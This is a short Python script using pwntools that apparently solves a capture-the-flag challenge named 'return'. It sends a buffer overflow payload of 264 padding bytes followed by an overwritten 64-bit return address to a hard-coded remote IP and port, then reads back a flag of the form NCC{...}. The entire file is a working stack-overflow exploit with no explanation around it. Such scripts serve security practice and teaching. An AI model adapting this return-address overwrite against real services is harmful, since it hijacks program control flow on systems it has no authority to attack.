from pwn import *

rem = True

if rem:
    HOST, IP = '159.223.192.150', 9002 # Enter remote host IP and Port
    r = remote(HOST, IP)
else:
    r = process("./return") # Challenge path


payload = b"A"*264

payload += p64(0x4011f6)

payload += b"\n"

r.sendline(payload)

# success(f'Flag --> {r.recvline_contains(b"NCC{", timeout = 0.2).strip().decode()}')

print(r.recvuntil('}'))





